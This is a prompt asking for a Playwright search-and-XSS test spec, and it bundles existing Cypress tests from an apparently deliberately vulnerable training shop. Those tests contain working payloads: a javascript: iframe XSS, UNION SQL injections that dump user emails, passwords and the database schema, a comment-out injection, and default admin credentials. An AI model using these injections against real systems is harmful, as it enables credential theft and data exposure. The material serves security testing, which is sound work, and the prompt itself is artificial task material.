@@ -1,0 +1,259 @@
+You are a senior test automation engineer. You write Playwright Test specs in TypeScript. Reply with exactly one TypeScript code block containing a complete, runnable spec file, and nothing else.
+
+Application under test: a web shop. The Playwright config sets baseURL to http://localhost:3000.
+Write a Playwright Test spec file (import { test, expect } from '@playwright/test') for this requirement.
+
+User story: As a customer I want to search for products by name so that I can find what I want to buy.
+Acceptance criteria:
+- A search returns the matching products.
+- Non-functional (security): the search field must not execute injected script content, i.e. it must resist reflected cross-site scripting.
+
+Relevant artifacts retrieved from the project's existing (Cypress) test suite. Reuse their selectors, routes, test data and setup where relevant, translated to Playwright:
+
+--- FILE: test/cypress/e2e/search.spec.ts ---
+import { type Product } from '../../../data/types'
+
+describe('/#/search', () => {
+  beforeEach(() => {
+    cy.visit('/#/search')
+  })
+  describe('challenge "localXssChallenge"', () => {
+    // Cypress alert bug
+    xit('search query should be susceptible to reflected XSS attacks', () => {
+      cy.get('#searchQuery').click()
+      cy.get('app-mat-search-bar input')
+        .type('<iframe src="javascript:alert(`xss`)">')
+        .type('{enter}')
+      cy.on('window:alert', (t) => {
+        expect(t).to.equal('xss')
+      })
+      cy.expectChallengeSolved({ challenge: 'DOM XSS' })
+    })
+  })
+  describe('challenge "xssBonusChallenge"', () => {
+    it('search query should be susceptible to reflected XSS attacks', () => {
+      cy.get('#searchQuery').click()
+      cy.get('app-mat-search-bar input')
+        .type(
+          '<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>'
+        )
+        .type('{enter}')
+      cy.expectChallengeSolved({ challenge: 'Bonus Payload' })
+    })
+  })
+})
+
+describe('/rest/products/search', () => {
+  describe('challenge "unionSqlInjectionChallenge"', () => {
+    it('query param in product search endpoint should be susceptible to UNION SQL injection attacks', () => {
+      cy.request(
+        "/rest/products/search?q=')) union select id,'2','3',email,password,'6','7','8','9','10' from users--"
+      )
+      cy.expectChallengeSolved({ challenge: 'User Credentials' })
+    })
+  })
+
+  describe('challenge "dbSchemaChallenge"', () => {
+    it('query param in product search endpoint should be susceptible to UNION SQL injection attacks', () => {
+      cy.request(
+        "/rest/products/search?q=')) union select sql,'2','3','4','5','6','7','8','9','10' from sqlite_master--"
+      )
+      cy.expectChallengeSolved({ challenge: 'Database Schema' })
+    })
+  })
+
+  describe('challenge "dlpPastebinLeakChallenge"', () => {
+    beforeEach(() => {
+      cy.login({
+        email: 'admin',
+        password: 'admin123'
+      })
+    })
+
+    it('search query should logically reveal the special product', () => {
+      cy.request("/rest/products/search?q='))--")
+        .its('body')
+        .then((sourceContent) => {
+          cy.task<Product>('GetPastebinLeakProduct').then((pastebinLeakProduct: Product) => {
+            let foundProduct = false
+
+            sourceContent.data.forEach((product: Product) => {
+              if (product.name === pastebinLeakProduct.name) {
+                foundProduct = true
+              }
+            })
+            // eslint-disable-next-line @typescript-eslint/no-unused-expressions
+            expect(foundProduct).to.be.true
+          })
+        })
+    })
+  })
+
+  xdescribe('challenge "christmasSpecialChallenge"', () => {
+    beforeEach(() => {
+      cy.login({
+        email: 'admin',
+        password: 'admin123'
+      })
+    })
+
+    it('search query should reveal logically deleted christmas special product on SQL injection attack', () => {
+      cy.request("/rest/products/search?q='))--")
+        .its('body')
+        .then((sourceContent) => {
+          cy.task<Product>('GetChristmasProduct').then((christmasProduct: Product) => {
+            let foundProduct = false
+
+            sourceContent.data.forEach((product: Product) => {
+              if (product.name === christmasProduct.name) {
+                foundProduct = true
+              }
+            })
+            // eslint-disable-next-line @typescript-eslint/no-unused-expressions
+            expect(foundProduct).to.be.true
+          })
+        })
+    })
+
+    it('should be able to place Christmas product into shopping card by id', () => {
+      cy.request('/api/products')
+        .its('body')
+        .then((sourceContent) => {
+          cy.task<Product>('GetChristmasProduct').then((christmasProduct: Product) => {
+            sourceContent.data.forEach((product: Product) => {
+              if (product.name === christmasProduct.name) {
+                cy.window().then(async () => {
+                  const response = await fetch(
+                    `${Cypress.config('baseUrl')}/api/BasketItems/`,
+                    {
+                      method: 'POST',
+                      cache: 'no-cache',
+                      headers: {
+                        'Content-type': 'application/json',
+                        Authorization: `Bearer ${localStorage.getItem(
+                          'token'
+                        )}`
+                      },
+                      body: JSON.stringify({
+                        BasketId: `${sessionStorage.getItem('bid')}`,
+                        ProductId: `${product.id}`,
+                        quantity: 1
+                      })
+                    }
+                  )
+                  if (response.status === 201) {
+                    console.log('Success')
+                  }
+                })
+              }
+            })
+          })
+        })
+
+      cy.visit('/#/basket')
+      cy.get('#checkoutButton').click()
+      cy.expectChallengeSolved({ challenge: 'Christmas Special' })
+    })
+  })
+})
+
+--- END FILE ---
+
+--- FILE: test/cypress/support/e2e.ts ---
+import './commands'
+import './setup'
+
+declare global {
+
+  namespace Cypress {
+    interface Chainable {
+      expectChallengeSolved: (value: { challenge: string }) => void
+      login: (value: {
+        email: string
+        password: string
+        totpSecret?: string
+      }) => void
+      eachSeries: any
+    }
+  }
+}
+
+--- END FILE ---
+
+--- FILE: test/cypress/support/commands.ts ---
+import { type Challenge } from '../../../data/types'
+
+Cypress.Commands.add(
+  'expectChallengeSolved',
+  (context: { challenge: string }) => {
+    cy.request({
+      method: 'GET',
+      url: '/api/Challenges/?name=' + context.challenge,
+      timeout: 60000
+    }).then((response) => {
+      let challenge: Challenge = response.body.data[0]
+
+      if (!challenge.solved) {
+        cy.wait(2000)
+        cy.request({
+          method: 'GET',
+          url: '/api/Challenges/?name=' + context.challenge,
+          timeout: 60000
+        }).then((secondResponse) => {
+          challenge = secondResponse.body.data[0]
+          // eslint-disable-next-line @typescript-eslint/no-unused-expressions
+          expect(challenge.solved).to.be.true
+        })
+      } else {
+        // eslint-disable-next-line @typescript-eslint/no-unused-expressions
+        expect(challenge.solved).to.be.true
+      }
+    })
+  }
+)
+
+Cypress.Commands.add(
+  'login',
+  (context: { email: string, password: string, totpSecret?: string }) => {
+    cy.visit('/#/login')
+    if (context.email.match(/\S+@\S+\.\S+/) != null) {
+      cy.get('#email').type(context.email)
+    } else {
+      cy.task<string>('GetFromConfig', 'application.domain').then(
+        (appDomain: string) => {
+          const email = context.email.concat('@', appDomain)
+          cy.get('#email').type(email)
+        }
+      )
+    }
+    cy.get('#password').type(context.password)
+    cy.get('#loginButton').click()
+    cy.wait(500)
+  }
+)
+
+function walkRecursivelyInArray (arr: number[], cb: any, index = 0) {
+  if (arr.length === 0) return
+  const ret = cb(index, arr.shift());
+
+  ((ret && ret.chainerId) ? ret : cy.wrap(ret))
+    .then((ret: boolean) => {
+      if (!ret) return
+      walkRecursivelyInArray(arr, cb, index + 1)
+    })
+}
+
+Cypress.Commands.add('eachSeries', { prevSubject: 'optional' } as any, (arrayGenerated: number[], checkFnToBeRunOnEach: any) => {
+  walkRecursivelyInArray(arrayGenerated, checkFnToBeRunOnEach)
+})
+
+--- END FILE ---
+
+--- FILE: test/cypress/support/setup.ts ---
+beforeEach(() => {
+  cy.setCookie('cookieconsent_status', 'dismiss')
+  cy.setCookie('welcomebanner_status', 'dismiss')
+  cy.setCookie('language', 'en')
+})
+
+--- END FILE ---
